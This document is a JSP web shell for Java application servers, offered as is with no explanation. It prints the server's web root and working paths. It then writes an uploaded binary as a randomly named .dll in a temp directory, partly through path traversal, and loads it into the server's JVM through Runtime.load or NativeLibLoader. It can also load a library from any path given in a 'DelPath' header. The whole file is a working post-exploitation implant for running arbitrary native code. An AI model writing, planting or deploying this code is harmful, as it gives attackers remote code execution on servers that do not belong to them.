<%@ page import="java.io.File" %>
<%@ page import="java.io.PrintWriter" %>
<%@ page import="java.util.Random" %>
<%@ page import="java.io.FileOutputStream" %>
<%@ page import="java.io.InputStream" %>
<%@ page import="com.sun.glass.utils.NativeLibLoader" %>
<%
    String webrootpath=request.getServletContext().getRealPath("/");
    String webjsppath=request.getServletPath();
    String midilepath=(new File(".").getAbsolutePath());
    PrintWriter outp = response.getWriter();
    outp.println("WebRootPath:");
    outp.println(webrootpath);
    outp.println("ServletPath:");
    outp.println(webjsppath);
    outp.println("WebServerPath:");
    outp.println(midilepath);
    try {
        boolean flag = false;
        String fp = request.getParameter("up");

        try {
            if (fp != null) {
                Random random = new Random(System.currentTimeMillis());
                String os = System.getProperty("os.name").toLowerCase();
                if (os.contains("windows")){
                    if (fp.contains("nat")){
                        String java = System.getProperty("java.home");
                        fp = java + "../../../../../../../../../../../../../../../temp/dm" + random.nextInt(10000000) + "1.dll";
                    }else {
                        fp = "C:/Windows/temp/dm"+ random.nextInt(10000000) + "1.dll";
                    }
                }else {
                    fp = "/tmp/dm"+ random.nextInt(10000000) + "1.dll";
                }
                File file = new File(fp);
                if (file.exists()){
                    outp.println("file is exists!");
                }else {
                    FileOutputStream fos = new FileOutputStream(file);
                    InputStream inputStream = request.getInputStream();
                    byte temp[] = new byte[1024];
                    int size = -1;
                    while ((size = inputStream.read(temp)) != -1) { // 循环读取
                        fos.write(temp, 0, size);
                    }
                    fos.flush();
                    fos.close();
                    fp = file.getAbsolutePath();
                    flag = true;
                    outp.println("dll is uploaded!!!");
                }
            }
        }catch (Exception e){}
        outp.println("dll location is " + fp);
        String delpath = null;
        if (flag){
            delpath = fp;
        }else {
            delpath = request.getHeader("DelPath");
        }
        if (!delpath.isEmpty()){
            try {
                if (flag){
                    Runtime.getRuntime().load(delpath);
                    outp.println(delpath + "dll is load!!!");
                    flag =false;
                }
                if (flag){
                    System.load(delpath);
                    outp.println(delpath + "dll is load!!!");
                    flag = false;
                }
            }catch (Exception e){
                try {
                    NativeLibLoader.loadLibrary(delpath);
                    outp.println(delpath + "dll is load!!!");
                    flag = false;
                }catch (Exception e1){
                    outp.println(e1);
                }
            }
            if (flag) {
                outp.println(delpath + "dll load is failed!!!");
            }

        }
    }catch (Exception e2){
        outp.println(e2);
    }
    outp.println("if dll  will be auto load in uploading !!!");
    outp.flush();
    outp.close();

%>